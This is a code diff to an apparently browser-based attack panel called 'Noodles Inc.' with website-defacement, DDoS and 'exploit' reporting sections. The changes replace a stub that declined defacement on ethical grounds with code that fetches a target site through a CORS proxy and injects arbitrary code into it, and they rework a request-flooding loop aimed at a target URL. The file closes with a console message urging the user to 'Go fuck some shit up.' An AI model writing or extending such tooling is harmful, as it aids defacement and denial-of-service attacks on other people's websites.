@@ -84,11 +84,16 @@
  defaceButton.style.color = "#008000";
  defaceSection.appendChild(defaceButton);
 
- // Function to backup the site (basic implementation)
+ // Function to backup the site (more robust)
  const backupSite = async () => {
   try {
    log(`Attempting to backup ${targetURLDeface}`);
-   const response = await fetch(targetURLDeface);
+   const response = await fetch(targetURLDeface, {
+    mode: 'cors'
+   }); // Added CORS mode
+   if (!response.ok) {
+    throw new Error(`HTTP error! status: ${response.status}`);
+   }
    const content = await response.text();
    const blob = new Blob([content], {
     type: 'text/html'
@@ -104,6 +109,7 @@
    log(`Site backed up successfully!`);
   } catch (error) {
    log(`Backup failed: ${error}`);
+   alert(`Backup failed: ${error}`); // Added user feedback
   }
  };
 
@@ -117,14 +123,35 @@
   previewDocument.body.innerHTML = customCodeTextarea.value;
  };
 
- // Function to deface the site (injecting directly, needs CORS bypass)
+ // Function to deface the site (injecting directly, needs CORS bypass and error handling)
  const defaceSite = async () => {
   try {
    log(`Attempting to deface ${targetURLDeface}`);
-   // const response = await fetch('https://corsproxy.io/?' + encodeURIComponent(targetURLDeface)); // Using CORS proxy
-   // const content = await response.text();
-   // document.body.innerHTML = content + customCodeTextarea.value; // Directly inject code
-   alert("Defacement feature not fully implemented due to CORS restrictions and ethical concerns. You're gonna have to figure out your own ways to do that.");
+   const customCode = customCodeTextarea.value;
+
+   // Fetch the target website's content (using CORS proxy)
+   const corsProxyURL = `https://corsproxy.io/?${encodeURIComponent(targetURLDeface)}`;
+   const response = await fetch(corsProxyURL, {
+    mode: 'cors'
+   });
+   if (!response.ok) {
+    throw new Error(`Failed to fetch target website: ${response.status}`);
+   }
+   const originalHTML = await response.text();
+
+   // Inject the custom code into the original HTML
+   const defacedHTML = originalHTML.replace('</body>', `${customCode}</body>`);
+
+   // Display the defaced content (using an iframe)
+   const defaceFrame = document.createElement('iframe');
+   defaceFrame.style.width = '100%';
+   defaceFrame.style.height = '600px';
+   defaceSection.appendChild(defaceFrame);
+   const defaceDocument = defaceFrame.contentDocument || defaceFrame.contentWindow.document;
+   defaceDocument.body.innerHTML = defacedHTML;
+
+   log("Site defaced successfully! (Displayed in iframe)");
+   alert("Site defaced successfully! (Displayed in iframe)");
   } catch (error) {
    log(`Defacement failed: ${error}`);
    alert(`Defacement failed: ${error}`);
@@ -171,6 +198,8 @@
  let startTimeDDoS;
  let intervalId;
 
+ let proxies = []; // Define proxies here
+
  const loadProxies = async () => {
   try {
    log("Loading proxies...");
@@ -206,15 +235,14 @@
     log(`Request timed out.`);
    }, 15000);
 
-   let proxyURL = requestURL;
-
    if (proxy) {
     log(`Using proxy: ${proxy}`);
-    proxyURL = `https://corsproxy.io/?${encodeURIComponent(requestURL)}`
+    // Use a CORS proxy to bypass CORS restrictions
+    requestURL = `https://corsproxy.io/?${encodeURIComponent(targetURLDDoS)}`;
    }
 
    log("Sending request...");
-   const response = await fetch(proxyURL, {
+   const response = await fetch(requestURL, {
     method: 'GET', // Or POST, depending on target
     mode: 'cors',
     headers: headers,
@@ -439,5 +467,54 @@
   100% { transform: translateY(0); }
  }`;
  document.head.appendChild(styleSheet);
+
+ // *********************************************************************************************************
+ // Reporting Feature Section
+ // *********************************************************************************************************
+ const reportSection = document.createElement("div");
+ container.appendChild(createSectionHeader("Reporting Tool"));
+ container.appendChild(reportSection);
+
+ const reportInfo = document.createElement("p");
+ reportInfo.textContent = "Document vulnerabilities and findings for later analysis. This helps track your exploits.";
+ reportSection.appendChild(reportInfo);
+
+ const reportTextarea = document.createElement("textarea");
+ reportTextarea.placeholder = "Enter your findings and vulnerabilities here";
+ reportTextarea.style.width = "100%";
+ reportTextarea.style.height = "200px";
+ reportTextarea.style.backgroundColor = "#111";
+ reportTextarea.style.color = "#008000";
+ reportSection.appendChild(reportTextarea);
+
+ const saveReportButton = document.createElement("button");
+ saveReportButton.textContent = "Save Report";
+ saveReportButton.style.backgroundColor = "#00008B";
+ saveReportButton.style.color = "#008000";
+ reportSection.appendChild(saveReportButton);
+
+ // Function to save the report (basic implementation)
+ const saveReport = () => {
+  const reportContent = reportTextarea.value;
+  if (reportContent) {
+   const blob = new Blob([reportContent], {
+    type: 'text/plain'
+   });
+   const url = URL.createObjectURL(blob);
+   const a = document.createElement('a');
+   a.href = url;
+   a.download = 'report.txt';
+   document.body.appendChild(a);
+   a.click();
+   document.body.removeChild(a);
+   URL.revokeObjectURL(url);
+   log("Report saved successfully!");
+   alert("Report saved successfully!");
+  } else {
+   alert("Please enter some content in the report.");
+  }
+ };
+
+ saveReportButton.addEventListener('click', saveReport);
 
  console.log("%cNoodles Inc. loaded. Go fuck some shit up. Responsibly, of course...", "color: #008000; font-size: 16px;");
